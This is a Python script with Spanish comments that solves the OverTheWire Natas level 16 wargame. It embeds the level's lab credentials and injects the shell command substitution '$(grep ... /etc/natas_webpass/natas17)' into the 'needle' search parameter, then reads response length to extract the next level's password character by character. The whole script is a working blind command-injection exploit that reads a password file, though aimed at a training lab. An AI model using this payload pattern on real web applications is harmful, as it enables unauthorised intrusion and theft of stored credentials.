import requests
#Importamos las letras en minusculas, mayusculas y los digitos decimales
from string import digits, ascii_lowercase, ascii_uppercase

# Concatenamos el conjunto de caracteres que posiblemente esten en el password de "natas17"
charset = ascii_lowercase + ascii_uppercase + digits
# Abrimos una sesión de petición para realizar multiples peticiones
s = requests.Session()
# Nos autenticamos con las credenciales del usuario de la web
s.auth = ('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
# Enlace de la web
url = 'http://natas16.natas.labs.overthewire.org/index.php'
# Aqui se guardara y unira cada caracter perteneciente al pass de natas17
password = ""

#Iteramos hasta que se encuentre la contraseña
while True:
    # Se itera por cada caracter del conjunto de caracteres
    for char in charset:
        # Se carga el comando en el campo
        payload = {'needle': f'$(grep ^{password}{char} /etc/natas_webpass/natas17)'}
        #Hacemos la petición
        r = s.get(url, params=payload)

        #Verificamos el tamaño de la respuesta, si es true, se añade el caracter
        if len(r.text) == 1105:
            password += char
            print("password so far: ", password)
            break #Se rompe el for, para que empiece de nuevo y encuentre la siguiente letra del pass
    
    #Cuando el for ya itero sobre todo el conjunto, eso quiere decir que la contraseña esta completa
    else:
        print("Password found: ", password)
        break
